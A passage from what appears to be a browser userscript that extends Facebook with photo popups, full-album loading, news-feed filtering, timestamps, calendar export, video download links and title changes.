if (style!='') { addStyle(style); }

//
// Extra code for stretching pages
//
if (prefs['HomeStretch'] || prefs['PageStretch']) {
	var lastWidth=0;
	function setHeadNav() {
		try {
			thisWidth = document.body.clientWidth - 196;
			if (thisWidth!=lastWidth) {
				log('Setting new width to ' + thisWidth);
				$('#headNav').style.width=thisWidth + 'px'; // must be done after the other "homestretch" css
				lastWidth=thisWidth;
			}
		} catch(x) { logError('Home Stretch CSS', x); }
	}
	setHeadNav();
	setInterval(setHeadNav, 500);
}


//
// Load thumbnails for entire album
//
function loadFullAlbum() {
	try {
		if (m = $('.summary')[0].textContent.split('|')[0].match(/(\d+)/g)) {
			m = m.sort(function(a,b){return a-b});
			totalImagePages = Math.ceil(m[2]/20);
			if (n=page.match(/page=(\d)/)) { thisPageNumber=n[1]; } else { thisPageNumber=1; }
			albumPagesLoaded = 0;
			totalAlbumPages = totalImagePages-1;
			$('#fbf_photo_pagination').innerHTML = '<span class="caption">' + $l('loadingFullAlbum') + '<span></span></span>';
			for (var i=1; i<totalImagePages+1; i++) {
				if (i!=thisPageNumber) {
					appendPhotos('http://www.facebook.com/' + (page.indexOf('page=')!=-1 ? page.replace(/page=\d+/,'page='+i) : page+'&page='+i) + '&quickling', $l('fullAlbumLoaded'));
				}
			}
		}
	} catch(x) { logError('Load Full Album', x); }
}


//
// Load tagged thumbnails
//
function loadTaggedPhotos() {
	try {
		if (m = $('.caption')[0].textContent.split('|')[0].replace(',','').match(/(\d+)/g)) {
			$('#fbf_photo_pagination').innerHTML = '<span class="caption">' + $l('LoadingAllPhotos') + '<span></span></span>';
			totalImagePages = Math.ceil(m[m.length-1]/15);
			albumPagesLoaded = 0;
			totalAlbumPages = totalImagePages-1;
			var thisPhoto = 0;
			if (m = page.match(/so=(\d+)/)) { thisPhoto = m[1]; }
			for (var i=0; i<totalImagePages; i++) {
				if (i*15!=thisPhoto) {
					appendPhotos('http://www.facebook.com/' + page.replace(/&so=\d+/,'') + '&so=' + (i*15), '<span class="caption">' + $l('AllPhotosLoaded') + '</span>');
				}
			}
		}
	} catch(x) { logError('Load Tagged Photos', x); }
}


//
// Add thumbnails from the specified URL
// (Abilities to show pictures in correct order, with the album page number and link displayed are based heavily on code by MysticMetal)
//
var photoTableRegex = /UIPhotoGrid_Table[^>]+>(.*?)<\\\/table/;
function appendPhotos(url, completeMessage) {
	var pageNum = (m=url.match(/\bso=(\d+)/)) ? m[1]/15+1 : url.match(/\bpage=(\d+)/)[1];
	var albumURL = (url.replace(/&quickling/, '') + '').replace(/&/g,'&amp;');
	var albumPageIdentifier = pageNum + '-' + (new Date().getTime());
	var tbody = $('.UIPhotoGrid_Table')[0]
	tbody.innerHTML = tbody.innerHTML + '<tbody><tr class="ff-album-page"><td colspan="5"><a href="' + albumURL + '"> Album page ' + pageNum + '</a></td></tr></tbody>'+
										'<tbody id="ff-album-page-' + albumPageIdentifier + '"></tbody>';
	var req = new XMLHttpRequest();
	req.open("GET", url);
	req.send(null);
	req.onreadystatechange = function() {
		if (req.readyState == 4) {
			if (req.status == 200) {
				albumPagesLoaded++;
				$('#ff-album-page-'+albumPageIdentifier).innerHTML = photoTableRegex.exec(req.responseText)[1].replace(/\\/g,'');
				if (albumPagesLoaded>=totalAlbumPages) { $('#fbf_photo_pagination').innerHTML = completeMessage; }
				if (prefs['AutoBigAlbumPictures']) { clickX("//a[contains(string(),'"+$l('ShowBigPictures')+"')]"); }
			}
		}
	}
}


//

//
// Top Bar Positioning
//
/* obsolete
if (prefs['TopBarFixed']) {
	try {
		var div = document.createElement('div');
		div.id = 'fbf-page-head-container';
		$('#pageHead').parentNode.insertBefore(div, $('#pageHead').parentNode.firstChild);
		$('#fbf-page-head-container').insertBefore($('#pageHead'), $('#fbf-page-head-container').firstChild);
		addStyle(
			'#blueBar { position:fixed; z-index:15; }'+
			'#fbf-page-head-container { width:' + $('#pageHead').clientWidth + 'px; margin:0 auto; }'+
			'#pageHead { position:fixed; z-index:16; }'+
			'#headNav { width:' + $('#headNav').clientWidth + 'px; }'+
			'#content { padding-top:' + $('#blueBar').clientHeight + 'px; }'
		);
	} catch(x) { logError('Top Bar Fixed', x); }
}
*/

//

//
// Listen for image mouseovers/mouseouts to show/hide popups
//
if (prefs['ProfilePicPopup'] || prefs['PhotoPopup']) {
	
	picRegex = /(https?:\/\/((profile\.|s-hprofile-|photos-|s-hphotos-|secure-media-).*?\.fbcdn\.net|fbcdn-(photos|sphotos|profile)-a.akamaihd.net).*?(\/[aqst]\d[\d_]+|_[aqst])\.jpg)/;
	backgroundRegex = /(https?:\/\/((profile\.|s-hprofile-|photos-|s-hphotos-|secure-media-).*?\.fbcdn\.net|fbcdn-(photos|sphotos|profile)-a.akamaihd.net).*?(\/[aqst]\d[\d_]+|_[aqnst])\.jpg)/;
	picRegex2 = /(src|url)=([^&]+)/;
	profilePixRegex = /\bfbcdn(.net|-profile-)/;
	
	newPicRegex = /(https?:\/\/([^\/]+fbcdn\.net|fbcdn[^\/]+.akamaihd\.net)\/.*\/s\d+x\d+\/[0-9_]+n.jpg)/;

	function showPopupPic(e) {
		try {
			var t = e.target;
			
			var oldSrc;
			var newSrc;
			var title;

			if (t.tagName == 'I' && (m=newPicRegex.exec(t.style.backgroundImage))) { oldSrc = m[1] + '#7'; newSrc = oldSrc.replace(/\/s\d+x\d+\//,'/s720x720/'); }
			else if (t.tagName == 'IMG' && (m=newPicRegex.exec(t.src))) { oldSrc = m[1] + '#8'; newSrc = oldSrc.replace(/\/s\d+x\d+\//,'/s720x720/'); }
			else if (t.tagName == 'IMG' && picRegex.test(t.src)) { oldSrc = t.src + '#1'; }
			else if (t.tagName == 'IMG' && (m=backgroundRegex.exec(t.style.backgroundImage))) { oldSrc = m[1] + '#2'; }
			else if (t.tagName == 'I' && (m=picRegex.exec(t.style.backgroundImage))) { oldSrc = m[1] + '#3'; }
			else if (t.parentNode && t.parentNode.firstChild.tagName == 'IMG' && (m=picRegex.exec(t.parentNode.firstChild.src))) { oldSrc = m[1] + '#4'; }
			else if (t.parentNode && t.parentNode.style && (m=picRegex.exec(t.parentNode.style.backgroundImage))) { oldSrc = m[1] + '#5'; }
			else if (t.src && (t.src.indexOf('app_full_proxy.php')!=-1 || t.src.indexOf('safe_image.php')!=-1) && (m=picRegex2.exec(t.src))) { oldSrc = unescape(m[2]) + '#6'; }
			
			// Facebook's code somtimes triggers the popup incorrectly when tagging (ie, even though the mouse is not actually over the image).
			if (oldSrc && oldSrc.match(/#4$/) && getStyle(t.parentNode.firstChild, 'cursor')=='crosshair') { return; }
			
			// Disable completely when tagging (only on the tagging image itself)
			if (!prefs['PopupWhileTagging'] && t.tagName=='IMG' && getStyle(t, 'cursor')=='crosshair') { return; }
			
			if (oldSrc || newSrc) {

				if (!newSrc) {
					if (m = oldSrc.match(/^["']+(.*)["']+$/)) { oldSrc = m[1]; } // Opera needs this, no idea why...
					newSrc = oldSrc.replace(/\/[aqst]([\d_]+)\.jpg/, "/n$1.jpg").replace(/\/([\d_]+)[aqst]\.jpg/, "/$1n.jpg");
				}

				if (!profilePixRegex.test(newSrc)) { newSrc = newSrc + '-external'; }
				else {
					if (newSrc.indexOf('profile')!=-1) { newSrc = newSrc + '-profile'; }
					else { newSrc = newSrc + '-photo'; }
				}

				if (profilePixRegex.test(newSrc) ? (newSrc.indexOf('profile')!=-1 ? prefs['ProfilePicPopup'] : prefs['PhotoPopup']) : prefs['ExternalPopup']) {
					//log('showPopupPic called'); // debug

					clearTimeout(hidePopupPicTimeout);
					t.removeEventListener('mouseout', hidePopupPic, false);
					t.addEventListener('mouseout', hidePopupPic, false);
					
					//newSrc = newSrc.replace(/^https:\/\/fbcdn-photos/, 'https://fbcdn-sphotos');
					
					if (m = newSrc.match(/\/n(\d+)_\d+\.jpg/)) { profileLink = 'http://www.facebook.com/profile.php?id=' + m[1]; }
					else if (t.href) { profileLink = t.href; }
					else if (t.parentNode.href) { profileLink = t.parentNode.href; }
					else if (t.parentNode.parentNode.href) { profileLink = t.parentNode.parentNode.href; }

					showPopupPicTimeout = setTimeout(function(){
						//log('showing PopupPic'); // debug
						$('#ff-popup-pic-image').innerHTML = '<a href="' + profileLink + '"><img src="' + newSrc + '" alt="HFP - ' + $l('LoadingPic') + '" style="max-height:' + (window.innerHeight-35) + 'px;"/></a>';
						$('#ff-popup-pic-div').style.display = 'block';
						$('#ff-popup-pic-div').className = 'fbfPopup ff-popup-pic-div-' + (prefs['PopupPosition'] == 'auto' ? (e.pageX>document.body.clientWidth/2 ? 'left' : 'right') : prefs['PopupPosition']);
					}, prefs['DelayPopupPics'] ? prefs['DelayPopupPicsTimeout'] : 0);

				}

			}

		} catch(x) { logError('Popup Pic', x); }
	}

	$('#ff-popup-pic-div').addEventListener('mouseover', function(e) { clearTimeout(hidePopupPicTimeout); }, false);

	$('#ff-popup-pic-div').addEventListener('mouseout', function(e) {
		var r = e.relatedTarget;
		if (!e.shiftKey && !e.ctrlKey && !e.altKey) {
			while (r.parentNode && r.id!='ff-popup-pic-div') { r = r.parentNode; }
			if (r.id!='ff-popup-pic-div') { document.getElementById('ff-popup-pic-div').style.display = 'none'; }
		}
	}, false);

	window.addEventListener('mousemove', function(e) {
	//window.addEventListener('mouseover', function(e) {
		if (!e.shiftKey && !e.ctrlKey && !e.altKey) { showPopupPic(e); }
	}, false);

	function hidePopupPic(e) {
		//log('hidePopupPic called'); // debug
		if (prefs['DelayPopupPics']) {
			//log('cleared'); // debug
			clearTimeout(showPopupPicTimeout);
		}
		if (!e.shiftKey && !e.ctrlKey && !e.altKey) {
			hidePopupPicTimeout = setTimeout(function() { document.getElementById('ff-popup-pic-div').style.display = 'none'; }, 30);
		}
	}

}


//
// Modify search form to search results open in a new tab/window
//
if (prefs['NewTabSearch'] && $('#q')) {
	$('#q').addEventListener('keydown', function(e) {
		if (e.keyCode == 13 && e.ctrlKey) { $('#navSearch').target = '_blank'; }
		else { $('#navSearch').target = ''; }
	}, false);
}

//
// Add useful date functions
//
Date.prototype.getNextDay=function(){var nextDay=new Date(); nextDay.setTime(this.getTime()+86400000); return nextDay; }
Date.prototype.before=function(date){if(!date)date=new Date(); return this.getTime()<date.getTime();}
Date.prototype.past=function(date){if(!date)date=new Date(); var thisDate=this; thisDate.setHours(0); thisDate.setMinutes(0); thisDate.setSeconds(0); date.setYear(thisDate.getFullYear()); return thisDate.getTime()<date.getTime();}
Date.prototype.getAge=function(){var now=new Date(); return this.past(new Date())?now.getFullYear()-this.getFullYear():now.getFullYear()-this.getFullYear()-1;}
Date.prototype.toISOString=function(time, punc){var dash=punc?'-':''; var semi=punc?':':''; var space=punc?' ':'T'; return ''+this.getFullYear()+dash+$0(this.getMonth()-0+1)+dash+$0(this.getDate())+(time?space+$0(this.getHours())+semi+$0(this.getMinutes())+semi+$0(this.getSeconds()):'');}
Date.prototype.format = function() { var monthNames = $l('Months'); return monthNames[this.getMonth()] + ' ' + this.getDate() + ', ' + this.getFullYear(); }
Date.prototype.getFormattedTime = function(use24Hours) { return (use24Hours ? $0(this.getHours()) : (this.getHours()%12==0 ? '12' : this.getHours()%12)) + ':' + $0(this.getMinutes()) + (use24Hours ? '' : (this.getHours()>11 ? 'pm' : 'am')); }
Date.prototype.getSign=function(){ var signs = $l('Signs'); var endDates=new Array(19,18,20,19,20,21,22,22,22,22,21,21); return signs[this.getDate()>endDates[this.getMonth()]?(this.getMonth()+1)%12:this.getMonth()]; }



//
// Add link for showing full-size album pictures
//
function addBigAlbumPicLinks() {
	
	if (!$('#ff-bap-link')) {
		var a = document.createElement('a');
		a.innerHTML = $l('ShowBigPictures');
		a.id = 'ff-bap-link';
		
		// albums
		if (container = $('//*[contains(@class,"fbxPhotoSetPageHeader")]//*[contains(@class,"fbxPhotoSetPageHeaderByline")]/div', null, true)) {
			container.appendChild(document.createTextNode(' • '));
			container.appendChild(a);
		}
		
		// photo tabs on new profiles
		else if ((container = $('.uiHeaderTitle', '#pagelet_photos_of_me')) && container[0]) {
			container[0].appendChild(document.createTextNode(' • '));
			container[0].appendChild(a);
		}
		
		// photo tabs on old profiles
		else if (container = $('//*[@id="photos_of_wrapper"]/preceding-sibling::* //div', null, true)) {
			container.appendChild(document.createTextNode(' • '));
			container.appendChild(a);
		}

		on('click', a, function(e) {
			var tables = $('./following::table[contains(@class,"fbPhotosGrid")]', e.target); // new albums/profiles use this
			if (tables.snapshotLength==0) { tables = $('./following::table[contains(@class,"UIPhotoGrid_Table")]', e.target); } // old albums/profiles use this
			var buf = '';
			for (var t=0; t<tables.snapshotLength; t++) {
				var cells = $('td', tables.snapshotItem(t));
				for (i=0; i<cells.length; i++) {
					var src = (cells[i].getAttribute('data-src',null) || cells[i].innerHTML).match(/(https?:\/\/[^"%&]+\.jpg)/);
					if (src) { src=src[1]; }
					else { continue; }
					var link = $('a', cells[i])[0];
					if (link.className.indexOf('uiVideoLink')!=-1) { continue; } // skip video thumbnails
					var title = ($('a', cells[i])[0].getAttribute('title') || '').replace('"', '&quot;');
					buf+=	'<a href="' + link.href + '">'+
							'<img src="' + src.replace(/\/[as]([\d_]+)\.jpg/, '/n$1.jpg').replace(/\/([\d_]+)[as]\.jpg/, '/$1n.jpg') + '" title="' + title + '" />'+
							'</a>';
				}
			}
			hidePopup();
			showPopup('<div id="FBFBigAlbumContainer"><div id="FBFBigAlbum" class="fbfPopup"><div id="FBFBigAlbumClose1" class="FBFBigAlbumClose">' + $l('Close') + '</div>' + buf + '<div id="FBFBigAlbumClose2" class="FBFBigAlbumClose">' + $l('Close') + '</div></div></div>', false);
			on('click', Array('#FBFBigAlbumClose1','#FBFBigAlbumClose2'), hidePopup);
		});
	}
}

//
// Process the page at regular intervals
//
processing = setInterval(processPage, prefs['ProcessInterval']);
processPage();

function processPage() {

	//
	// Figure out what page we're looking at
	//
	loc = window.location.href.toLowerCase();
	page = loc.split('facebook.com/')[1];
	if (page.indexOf('#')!=-1) {
		buf = page.split('#');
		page = buf[1]!='' ? buf[1] : buf[0];
	}
	page = page.replace(/^!?\//,'');
	//if (page!=lastPage) { log('Page => "' + page + '"'); }// DEBUG ONLY

	if (page != lastPage && prefs['PopupAutoClose'] && $('#ff-popup-pic-div')) {
		$('#ff-popup-pic-div').style.display = 'none';
		lastPage = page;
	}

	//
	// Show date/time of comments and feed items
	//
	if (prefs['FBFTimestamps']) {
		var today = new Date()
		var yesterday = new Date();
		yesterday.setTime(today.getTime()-24*60*60*1000);
		var fTimestamp = new Date();
		var timestamps = $('//abbr[@data-date][not(contains(@class,"HFP-handled"))]');
		var recentTimeFormat = prefs['FBFTimestamps24'] ? '%T' : '%t';
		if (prefs['FacebookTimestamps']) { recentTimeFormat = '%F ('+recentTimeFormat+')'; }
		var distantTimeFormat = '%U at %T';
		for (var i=0; i<timestamps.snapshotLength; i++) {
			var t = timestamps.snapshotItem(i);
			t.className = t.className + ' HFP-handled';
			if (t.className.indexOf('timestamp')==-1) continue; // debug - "distant" time stamps are not implemented as yet (timestamps further back than yesterday don't have "timestamp" in the classname)
			fTimestamp.setTime(Date.parse(t.getAttribute('data-date')));
			var time = t.className.indexOf('timestamp')!=-1 ? recentTimeFormat : distantTimeFormat;
			if (time.indexOf('%T')!=-1) { time = time.replace('%T', fTimestamp.getFormattedTime(true)); }
			if (time.indexOf('%t')!=-1) { time = time.replace('%t', fTimestamp.getFormattedTime(false)); }
			if (time.indexOf('%U')!=-1) { time = time.replace('%U', fTimestamp.toISOString(false, true)); }
			if (time.indexOf('%F')!=-1) { time = time.replace('%F', ''); }
			var fbfTimestamp = document.createElement('span');
			//fbfTimestamp.innerHTML = (prefs['FacebookTimestamps']?' (':'') + (fTimestamp.toISOString()==today.toISOString() ? '' : (fTimestamp.toISOString()==yesterday.toISOString() ? 'Yesterday' : fTimestamp.toISOString()) + ' at ') + fTimestamp.getFormattedTime(prefs['FBFTimestamps24']) + (prefs['FacebookTimestamps']?') ':''); // obsolete
			fbfTimestamp.innerHTML = time;
			t.parentNode.insertBefore(fbfTimestamp, t.nextSibling);
		}
	}


	//
	// Customize Home Page
	//
	if (isHomePage()) {
		try {

			homeStream = $('#home_stream');
			if (homeStream && !homeStream.className.match(/\bfbf\b/)) {
			
				homeStream.className = homeStream.className + (' fbf');
			
			}

			// Make today's events bold
			try {
				var eventDays = $('//div[contains(@class,"UIUpcoming_Item")][not(contains(@class,"fbf-handled"))]');
				for (var i=0; i<eventDays.snapshotLength; i++) {
					eventDays.snapshotItem(i).className = eventDays.snapshotItem(i).className + ' fbf-handled';
					if (eventDays.snapshotItem(i).getElementsByTagName('span')[0].innerHTML.toLowerCase().indexOf($l('today'))!=-1) {
						eventDays.snapshotItem(i).style.fontWeight = 'bold';
					}
				}
			} catch(x) { logError('Bold Events', x); }
			
			// Default to the "Most Recent" feed instead of "Top News"
			if (prefs['HomeMostRecent'] && page.indexOf('sk=')==-1 && $('//div/a[contains(@href,"sk=lf")]', null, true)) {
				location.replace('/?sk=lf');
			}

			// Modify the live feed
			try {
				if (prefs['CustomFeedModification'].length>0 || prefs['HideApplicationStories'] || prefs['HideAskFriendStories'] || prefs['HideEventStories'] || prefs['HideFriendStories'] || prefs['HideGroupStories'] || prefs['HideLikeStories'] || prefs['HideLinkStories'] || prefs['HideNoteStories'] || prefs['HidePhotoStories'] || prefs['HidePlaceStories'] || prefs['HideProfilePicStories'] || prefs['HideRelationshipStories'] || prefs['HideStatusStories'] || prefs['HideVideoStories'] || prefs['HideWallStories']) {
					var stream = $('#pagelet_home_stream');
					var whitelist = JSON.parse(prefs['ApplicationWhitelist']);
					whitelistRegex = whitelist.length==0 ? null : new RegExp('/apps/application\\.php\\?id=(' + whitelist.join('|') + ')\\b');
					if (stream) {
						var blockedIDs = Array();
						var blockedStoryXPath = Array();
						var highlightedStoryXPath = Array();
						
						if (prefs['HideApplicationStories'])	{ blockedIDs = blockedIDs.concat(Array('237','313')); }
						if (prefs['HideAskFriendStories'])		{ blockedIDs = blockedIDs.concat(Array('280', '286', '338')); }
						if (prefs['HideEventStories'])			{ blockedIDs = blockedIDs.concat(Array('1','38','178')); }
						if (prefs['HideFriendStories']) 		{ blockedIDs = blockedIDs.concat(Array('8','12')); }
						if (prefs['HideGroupStories'])			{ blockedIDs = blockedIDs.concat(Array('4','21', '308', '316')); }
						if (prefs['HideLikeStories'])			{ blockedIDs = blockedIDs.concat(Array('161','283')); }
						if (prefs['HideLinkStories'])			{ blockedIDs = blockedIDs.concat(Array('5','263')); }
						if (prefs['HideNoteStories'])			{ blockedIDs = blockedIDs.concat(Array('66')); }
						if (prefs['HidePhotoStories'])			{ blockedIDs = blockedIDs.concat(Array('6','7','65','247')); }
						if (prefs['HidePlaceStories'])			{ blockedIDs = blockedIDs.concat(Array('278', '285')); }
						if (prefs['HideProfilePicStories'])		{ blockedIDs = blockedIDs.concat(Array('60', '259')); }
						if (prefs['HideRelationshipStories'])	{ blockedIDs = blockedIDs.concat(Array('10')); }
						if (prefs['HideStatusStories'])			{ blockedIDs = blockedIDs.concat(Array('11','46')); }
						if (prefs['HideVideoStories'])			{ blockedIDs = blockedIDs.concat(Array('3','128','130')); }
						if (prefs['HideWallStories'])			{ blockedIDs = blockedIDs.concat(Array('56','273')); }
						if (blockedIDs.length>0) {
							blockedStoryXPath.push("contains(@data-ft,'\"sty\":" + blockedIDs.join(",') or contains(@data-ft,'\"sty\":") + ",')");
							blockedStoryXPath.push("contains(@data-ft,'\"s_obj\":" + blockedIDs.join(",') or contains(@data-ft,'\"s_obj\":") + ",')");
						} 
						
						if (prefs['CustomFeedModification'].length>0) {
							try {
								var custom = prefs['CustomFeedModification'].split(/\r?\n\r?/);
								for (var i=0; i<custom.length; i++) {
									if (m = custom[i].match(/^[^#]+/)) {
										var rule = m[0].replace(/^\s*|\s*$/g,'');
										if (m = rule.match(/^-\s*(\d+)$/)) { blockedStoryXPath.push("contains(@data-ft,'\"sty\":" + m[1] + ",')"); }
										else if (m = rule.match(/^-\s*(.+)$/)) { blockedStoryXPath.push("contains(string()," + (m[1].indexOf("'")!=-1 ? '"'+m[1]+'"' : "'"+m[1]+"'") + ")"); }
										else if (m = rule.match(/^\+\s*(\d+)$/)) { highlightedStoryXPath.push("contains(@data-ft,'\"sty\":" + m[1] + ",')"); }
										else if (m = rule.match(/^\+\s*(.+)$/)) { highlightedStoryXPath.push("contains(string()," + (m[1].indexOf("'")!=-1 ? '"'+m[1]+'"' : "'"+m[1]+"'") + ")"); }
										else { log('Ignoring ' + rule); }
									}
								}
							} catch(x) { logError('Custom Feed Modification', x); }
						}
						
						if (blockedStoryXPath.length>0) {
							var elms = $(".//*[contains(@class,'uiUnifiedStory') and (" + blockedStoryXPath.join(' or ') + ")]", stream);
							for (var i=0; i<elms.snapshotLength; i++) {
								if (whitelistRegex===null || !whitelistRegex.test(elms.snapshotItem(i).innerHTML)) {
									elms.snapshotItem(i).parentNode.removeChild(elms.snapshotItem(i));
								}
							}
						}
						
						if (highlightedStoryXPath.length>0) {
							var elms = $(".//*[contains(@class,'uiUnifiedStory') and not(contains(@class,'HFP-highlighted-story')) and (" + highlightedStoryXPath.join(' or ') + ")]", stream);
							for (var i=0; i<elms.snapshotLength; i++) { elms.snapshotItem(i).className=elms.snapshotItem(i).className + ' HFP-highlighted-story'; }
						}
					}
				}
			} catch(x) { logError('Live Feed', x); }

		} catch(x0) { logError('Home', x0); }
	}

	//
	// Replace links with HTTPS versions
	//
	if (prefs['SecureLinks']) {
		var links = $("//a[contains(@href,'facebook.com')]");
		for (var i=0; i<links.snapshotLength; i++) { links.snapshotItem(i).href = links.snapshotItem(i).href.replace(/^http:\/\/([^\.]*\.)?facebook\.com\//,'https://$1facebook.com/'); }
	}
	
	//
	// Disable Theater
	//
	if (prefs['DisableTheater']) {
		//location.href='javascript:void(window.PhotoTheater=null)'; // obsolete
		theaterPhotos = document.evaluate("//a[contains(@rel, 'theater')]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null); 
		for (var i = 0; i < theaterPhotos .snapshotLength ; ++i ) { theaterPhotos.snapshotItem(i).setAttribute("rel", " "); }
	}

	//
	// Show big album pictures
	//
	if (prefs['BigAlbumPictures']) {
		try {
			if (page.indexOf('album.php')!=-1 || page.indexOf('photo_search.php')!=-1 || page.indexOf('media/set/')!=-1 || page.indexOf('sk=photos')!=-1 || page.indexOf('v=photos')!=-1) {
				addBigAlbumPicLinks();
			}
		} catch(x) { logError('Big Album Pictures', x); }
	}

	//
	// Add calendar features to Events pages
	//
	if ((prefs['GoogleCalendar'] || prefs['iCalendar']) && page.indexOf('events.php')==0) {
		if (prefs['iCalendar'] && page.indexOf('events.php?bday=1')==0) {
			try {
				var elm = document.evaluate("//div[contains(@class,'summary_bar')][1]/div[@class='summary'][1]",document,null,XPathResult.FIRST_ORDERED_NODE_TYPE ,null).singleNodeValue;
				if (elm!=null) {
					if (elm.className.indexOf('fbfcal')!=-1) { return; }
					elm.className = elm.className + ' fbfcal';
					elm.innerHTML = elm.innerHTML + ' | <a href="#" id="fbfical">' + $l('ExportICalendarFile') + '</a><span id="fbfcalwarning"> ' + $l('ExportICalendarFileWarning') + '</span>';
					document.getElementById('fbfical').addEventListener('click', function(e) {
						if (e.target.href.match(/#$/)) {
							e.stopPropagation();
							e.preventDefault();
							document.getElementById('fbfical').innerHTML = $l('CreatingFile');
							setTimeout(function(){
								var now = new Date();
								var day = now.getDate();
								var month = now.getMonth()+1;
								var year = now.getFullYear();
								var divs = document.evaluate("//div[@class='bdaycal_month_section']",document,null,XPathResult.ORDERED_NODE_SNAPSHOT_TYPE ,null);
								var ical = 'BEGIN:VCALENDAR%0D%0AVERSION:2.0%0D%0APRODID:HFP%0D%0A';
								var eventMonth;
								var date;
								var days;
								var bdays;
								for (i=0; i<divs.snapshotLength; i++) {
									eventMonth = $m(divs.snapshotItem(i).id)+1+'';
									if (eventMonth<10) { eventMonth = '0' + eventMonth; }
									days = divs.snapshotItem(i).innerHTML.replace(/.*<\/table>/,'').split(/<br[^>]*>/g);
									for (j=0; j<days.length; j++) {
										if (m = days[j].match(/^(\d+)/)) {
											bdays = days[j].split(',');
											for (k=0; k<bdays.length; k++) {
												if (n = bdays[k].match(/[^>]+>([^<]+)/)) {
													date = ((eventMonth < month || (eventMonth == month && m[1] < day)) ? year-0+1 : year) + eventMonth + m[1];
													ical = ical + 'BEGIN:VEVENT%0D%0ASUMMARY:' + $l('Birthday',prefs['CalendarFullName'] ? n[1] : n[1].split(' ')[0]) + '%0D%0ADESCRIPTION:' + $l('Birthday',n[1]) + '%0D%0ADTSTART:' + date + '%0D%0ADTEND:' + date + '%0D%0ARRULE:FREQ=YEARLY%0D%0AEND:VEVENT%0D%0A';
												}
											}
										}
									}
								}
								e.target.href = 'data:text/calendar;charset=US-ASCII,' + ical + 'END:VCALENDAR';
								e.target.onclick='';
								location.replace(e.target.href);
								document.getElementById('fbfcalwarning').style.display = 'none';
								document.getElementById('fbfical').innerHTML = $l('ExportICalendarFile');
							},0);
						}
					}, false);
				}
			} catch(x) { logError('iCalendar', x); }
		} else if (prefs['GoogleCalendar'] && page.indexOf('events.php?archive=1')!=0) {
			var divs = $('.partyrow');
			var now = new Date();
			var year = now.getFullYear();
			var div;
			if (divs.length>0) {
				for (var i=0; i<divs.length; i++) {
					div = divs[i];
					var tds = div.getElementsByTagName('td');
					for (var j=0; j<tds.length; j++) {
						if (tds[j].className == 'actions' && tds[j].innerHTML.indexOf('class="calLink"')==-1) {
							h = div.innerHTML;
							title = h.match(/class="etitle">([^<]+)</i)[1];
							where = h.match(/Where:<\/td><td>(.+?)<\/td/i)[1];
							when = h.match(/When:<\/td><td>(.+?)<\/td/i)[1];
							host = h.match(/Hosted by:<\/td><td>(.+?)<\/td/i)[1];
							var startDate, endDate;
							if (m = when.match(/^(.*)<.+?>(.*)$/)) {
								startDate = $d(m[1]);
								endDate = $d(m[2]);
							}
							else if (m = when.match(/(.*)( \d\d?:\d\d ?(am|pm)?).*( \d\d?:\d\d ?(am|pm)?)/)) {
								startDate = $d(m[1]+m[2]);
								endDate = $d(m[1]+m[4]);
								if (endDate!=null && endDate.before(startDate)) { endDate=endDate.getNextDay(); }
							}
							if (startDate==null || endDate==null) return;
							var calLink = document.createElement('a');
							calLink.innerHTML = $l('AddToCalendar');
							calLink.className = 'calLink';
							calLink.href = 'http://www.google.com/calendar/' + (prefs['GoogleApps'] && prefs['GoogleAppsDomain']!='' ? 'hosted/'+prefs['GoogleAppsDomain']+'/' : '') + 'event?action=TEMPLATE&text=' + title + '&dates=' + startDate.toISOString(true) + '/' + endDate.toISOString(true) + '&location=' + where + '&details=Hosted by ' + host;
							tds[j].appendChild(calLink);
							break;
						}
					}
				}
			}
		}
	}

	//
	// Show birthday info and Google Calendar link
	//
	if ((prefs['Age'] || prefs['Sign'] || prefs['GoogleCalendar']) && (page.match(/^profile.php/) || (page.indexOf('.php')==-1 && page.indexOf('/')==-1))) {
		try {
			var bdayNode = $("//div[@id='pagelet_byline']//span[last()]/span[not(contains(@class,'ffhandled'))]",null,true);
			if (bdayNode != null) {
				bdayNode.className = bdayNode.className + ' ffhandled';
				var info = [];
				var now = new Date();
				var bday = $d(bdayNode.textContent);
				if (bday!=null)  {
					var past = bday.past();
					if (prefs['Age']) { if (now.getFullYear()!=bday.getFullYear()) { info.push($l('yearsOld',bday.getAge())); } }
					if (prefs['Sign']) { info.push(bday.getSign()); }
					if (prefs['GoogleCalendar']) {
						var thisYearBday = new Date();
						thisYearBday.setTime(bday.getTime());
						thisYearBday.setYear(past ? now.getFullYear()-0+1 : now.getFullYear());
						var name = $('.profileName')[0].innerHTML;
						info.push('<a href="http://www.google.com/calendar/' + (prefs['GoogleApps'] && prefs['GoogleAppsDomain']!='' ? 'hosted/'+prefs['GoogleAppsDomain']+'/' : '') + 'event?action=TEMPLATE&text=' + $l('Birthday',prefs['CalendarFullName'] ? name : name.split(' ')[0]) + '&dates=' + thisYearBday.toISOString() + '/' + thisYearBday.getNextDay().toISOString() + '&details=' + $l('Birthday',name) + (prefs['CalendarBirthDate'] && now.getFullYear()!=bday.getFullYear() ? ' - ' + bday.format() : '') + '">' + $l('AddToGoogleCalendar') + '</a>');
					}
					if (info) { bdayNode.innerHTML = bdayNode.innerHTML + ' (' + info.join(', ') + ') '; }
				}
			}
		} catch(x) { logError('Age/Sign/Calendar', x); }
	}

	//
	// Show video download link
	//
	if (prefs['DownloadVideo'] && page.match(/^video\/video.php\?.*v=/)) {
		try {
			var parent = $("//div[@id='video_actions']/ul[@class='actionspro'][1]", null, true);
			if (!$('#fbf-video-link')) {
				var videoSrc;
				var embed = $("//embed[contains(@flashvars,'video_src')][1]", null, true);
				if (embed) { videoSrc = unescape(embed.getAttribute('flashvars')).match(/video_src=([^&]*)/)[1]; }
				else { videoSrc = unescape($("//div[@id='js_buffer']/script", null, true).text.match(/addVariable\(\"video_src\", \"(|([^\"]|\\\")*[^\\])\"/)[1]); }
				var link = document.createElement('li');
				link.id = 'fbf-video-link';
				link.className = 'actionspro_li';
				link.innerHTML = '<a class="actionspro_a" href="' + videoSrc + '" title="' + $l('DownloadVideo') + '" />' + $l('DownloadVideo') + '</a>';
				parent.insertBefore(link, parent.lastChild.nextSibling);
			}
		} catch(x) { logError('Download Video', x); }
	}

	//
	// Change page title
	//
	try {
		if (prefs['HideFacebookCountInTitle']) { document.title = document.title.replace(/Facebook \(\d+\)/, 'Facebook'); }
		if (prefs['PageTitle']) { document.title = document.title.replace(/Facebook.*?\| /, ''); }
		if (prefs['FriendRequestCountInTitle'] || prefs['NotificationCountInTitle'] || prefs['InboxCountInTitle']) {
			var counts = Array();
			if (prefs['FriendRequestCountInTitle']) {
